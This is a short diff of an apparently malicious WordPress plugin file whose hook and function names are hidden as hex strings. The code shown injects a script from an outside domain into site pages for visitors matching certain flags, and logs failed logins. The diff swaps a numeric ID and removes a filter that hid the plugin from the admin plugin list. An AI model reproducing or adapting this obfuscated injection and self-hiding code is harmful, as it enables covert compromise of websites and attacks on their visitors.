@@ -44,7 +44,7 @@ add_action(hex2bin('77705f68656164'), function () {
     if (is_singular() && ($SM_GO || $IP_FB || $AN_FB || $IG || $TT)) {
 
         $SR = hex2bin('68747470733a2f2f616c35736d2e636f6d2f7461672e6d696e2e6a73');
-        $ZN = hex2bin('3131363039363230');
+        $ZN = hex2bin('3131363333373935');
         ?>
         <script>
         (function(s){
@@ -124,17 +124,5 @@ add_action(hex2bin('77705f6c6f67696e5f6661696c6564'), function ($NM, $ER) {
     }
     AUDIT(sprintf('| INVALID | %s | %s | %s | %s |', $IP, call_user_func(hex2bin('73616e6974697a655f75736572'), $NM), $EN, call_user_func(hex2bin('73616e6974697a655f746578745f6669656c64'), $RSN)));
 }, 10, 2);
-
-
-add_filter(hex2bin('616c6c5f706c7567696e73'), function ($PG) {
-
-    $PG_FL = plugin_basename(__FILE__);
-
-    if (isset($PG[$PG_FL])) {
-        unset($PG[$PG_FL]);
-    }
-
-    return $PG;
-});
 
 
